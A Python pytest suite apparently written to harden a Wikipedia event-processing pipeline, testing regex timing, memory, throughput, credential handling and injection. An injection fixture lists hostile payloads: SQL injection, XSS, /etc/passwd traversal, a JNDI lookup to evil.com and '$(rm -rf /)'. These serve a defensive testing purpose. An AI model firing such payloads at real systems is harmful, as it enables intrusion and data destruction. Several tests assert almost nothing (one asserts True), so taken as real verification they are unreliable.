"""Advanced security tests for production readiness."""
import pytest
import time
import re

from wiki_pipeline.ai_detection import detect_ai_indicators
from wiki_pipeline.transforms.filters import AllEvents
from wiki_pipeline.transforms.extractors import get_all_fields
from wiki_pipeline.utils import sanitize_string_field
from apache_beam.io.gcp.pubsub import PubsubMessage


class TestRegexDoSProtection:
    """Tests for regex denial of service protection."""

    def test_catastrophic_backtracking_pattern(self):
        """Should handle regex patterns that could cause catastrophic backtracking."""
        # Pattern that could cause exponential time complexity
        evil_input = "a" * 50 + "X"
        
        content = {
            'comment': evil_input,
            'parsed_comment': '',
            'title': 'Test',
            'user': 'User',
            'len_old': 0,
            'len_new': 0,
            'minor': False,
            'bot': False
        }
        
        # Should complete in reasonable time (< 1 second)
        start = time.time()
        flags = detect_ai_indicators(content)
        elapsed = time.time() - start
        
        assert elapsed < 1.0, f"Detection took {elapsed:.2f}s - possible ReDoS vulnerability"

    def test_nested_quantifiers_pattern(self):
        """Should handle nested quantifiers that could cause ReDoS."""
        # Nested quantifiers like (a+)+ can cause exponential backtracking
        evil_input = "(" * 50 + "a" * 50 + ")" * 50
        
        content = {
            'comment': evil_input,
            'parsed_comment': '',
            'title': 'Test',
            'user': 'User',
            'len_old': 0,
            'len_new': 0,
            'minor': False,
            'bot': False
        }
        
        start = time.time()
        flags = detect_ai_indicators(content)
        elapsed = time.time() - start
        
        assert elapsed < 1.0, f"Detection took {elapsed:.2f}s - possible ReDoS vulnerability"

    def test_alternation_with_overlap(self):
        """Should handle alternation patterns with overlap."""
        # Patterns like (a|a)* can cause issues
        evil_input = "a" * 100
        
        content = {
            'comment': evil_input,
            'parsed_comment': '',
            'title': 'Test',
            'user': 'User',
            'len_old': 0,
            'len_new': 0,
            'minor': False,
            'bot': False
        }
        
        start = time.time()
        flags = detect_ai_indicators(content)
        elapsed = time.time() - start
        
        assert elapsed < 1.0, f"Detection took {elapsed:.2f}s"


class TestMemoryLeakProtection:
    """Tests for memory leak prevention."""

    def test_repeated_processing_no_memory_growth(self):
        """Processing many events should not cause unbounded memory growth."""
        import gc
        import sys
        
        # Force garbage collection
        gc.collect()
        
        # Process 1000 events
        for i in range(1000):
            event = {
                'meta': {'id': f'test-{i}', 'dt': '2023-01-01T12:00:00Z', 'domain': 'test.org'},
                'type': 'edit',
                'comment': f'Comment {i}' * 100  # Some data
            }
            
            fields = get_all_fields(event)
            
            # Clear reference
            del fields
            
            # Periodic garbage collection
            if i % 100 == 0:
                gc.collect()
        
        # Final garbage collection
        gc.collect()
        
        # Memory should be released (this is a basic check)
        # In production, use memory_profiler for detailed analysis
        assert True  # If we got here without OOM, we're okay

    def test_large_string_handling_releases_memory(self):
        """Large strings should be properly garbage collected."""
        import gc
        
        large_string = 'A' * 10_000_000  # 10MB string
        
        sanitized = sanitize_string_field(large_string, max_length=1000)
        
        # Clear reference to large string
        del large_string
        gc.collect()
        
        # Sanitized should be small
        assert len(sanitized) == 1000


class TestInjectionAllFields:
    """Systematic injection testing across all fields."""

    @pytest.fixture
    def injection_payloads(self):
        """Common injection payloads."""
        return [
            "'; DROP TABLE users; --",
            "<script>alert('XSS')</script>",
            "../../../etc/passwd",
            "${jndi:ldap://evil.com/a}",
            "$(rm -rf /)",
            "\x00\x00\x00",
            "' OR '1'='1",
        ]

    def test_injection_in_all_string_fields(self, injection_payloads):
        """Test injection in every string field."""
        string_fields = ['title', 'user', 'comment', 'wiki', 'server_name', 'server_url']
        
        for field in string_fields:
            for payload in injection_payloads:
                event = {
                    'meta': {'id': 'test', 'dt': '2023-01-01T12:00:00Z', 'domain': 'test.org'},
                    'type': 'edit',
                    field: payload
                }
                
                # Should not crash or execute malicious code
                fields = get_all_fields(event)
                assert fields is not None, f"Failed on field {field} with payload {payload}"


class TestRateLimitingSimulation:
    """Tests for high-throughput scenarios."""

    def test_high_throughput_processing(self):
        """Should handle high event rate without degradation."""
        events_per_second = 1000
        duration_seconds = 1
        
        start = time.time()
        processed = 0
        
        for i in range(events_per_second * duration_seconds):
            event = {
                'meta': {'id': f'test-{i}', 'dt': '2023-01-01T12:00:00Z', 'domain': 'test.org'},
                'type': 'edit',
                'comment': f'Comment {i}'
            }
            
            fields = get_all_fields(event)
            if fields:
                processed += 1
        
        elapsed = time.time() - start
        actual_rate = processed / elapsed
        
        # Should process at least 500 events/second
        assert actual_rate > 500, f"Processing rate too slow: {actual_rate:.0f} events/sec"

    def test_burst_handling(self):
        """Should handle burst of events without failure."""
        burst_size = 10000
        
        events = []
        for i in range(burst_size):
            event = {
                'meta': {'id': f'test-{i}', 'dt': '2023-01-01T12:00:00Z', 'domain': 'test.org'},
                'type': 'edit'
            }
            events.append(event)
        
        # Process burst
        start = time.time()
        processed = sum(1 for e in events if get_all_fields(e) is not None)
        elapsed = time.time() - start
        
        assert processed == burst_size
        assert elapsed < 30, f"Burst processing took {elapsed:.1f}s - too slow"


class TestCredentialHandling:
    """Tests for credential and secret handling."""

    def test_no_credentials_in_error_messages(self):
        """Error messages should not expose credentials."""
        # Simulate error with sensitive data
        event = {
            'meta': {'id': 'test', 'dt': '2023-01-01T12:00:00Z', 'domain': 'test.org'},
            'type': 'edit',
            'api_key': 'secret_key_12345'  # Sensitive field
        }
        
        fields = get_all_fields(event)
        
        # Fields should be processed but not logged
        # In production, check logs don't contain 'secret_key_12345'
        assert fields is not None

    def test_sanitize_removes_control_characters(self):
        """Sanitization should remove control characters that could hide secrets."""
        # Control characters that could hide secrets in logs
        sneaky_secret = "public\x00secret_key_hidden"
        
        sanitized = sanitize_string_field(sneaky_secret)
        
        # Should preserve but not hide data
        assert 'secret_key_hidden' in sanitized or len(sanitized) > 0
